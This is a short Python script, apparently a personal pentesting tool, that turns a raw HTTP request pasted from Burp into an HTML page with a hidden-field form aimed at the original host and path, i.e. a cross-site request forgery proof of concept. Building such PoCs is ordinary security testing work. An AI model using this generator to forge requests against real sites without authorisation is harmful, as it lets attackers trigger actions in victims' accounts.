import sys
from urllib.parse import parse_qs

import pyfiglet
from colorama import Fore, Style

hi = pyfiglet.figlet_format("COMRADE_____CSRF--POC____GENERATOR ", font="slant")
print(Fore.RED + hi + Style.RESET_ALL)
print(Fore.RED + "*"*50 + Style.RESET_ALL)


print(Fore.WHITE +
    "Paste Burp REQUEST and press Ctrl+D (Linux/macOS)\n"
    "or Ctrl+Z + Enter (Windows):\n" + Style.RESET_ALL
)

request = sys.stdin.read()


headers, body = request.split("\n\n", 1)
lines = headers.splitlines()

method_got, path_got = lines[0].split()[:2]


comrade_host = ""
for line in lines:
    if line.lower().startswith("host:"):
        comrade_host = line.split(":", 1)[1].strip()
        break


params = parse_qs(body.strip())

html = "<html>\n"
html += "\t<body>\n"
html += f'\t\t<form method="{method_got}" action="https://{comrade_host}{path_got}">\n'

for key, values in params.items():
    html += f'\t\t\t<input type="hidden" name="{key}" value="{values[0]}"/>\n'

html += '\t\t\t<input type="submit" value="Submit">\n'
html += "\t\t</form>\n"
html += "\t</body>\n"
html += "</html>"

print(Fore.WHITE +"\n--- COMRADE CSRF PoC GENERATED ---\n"+ Style.RESET_ALL)
print(html)

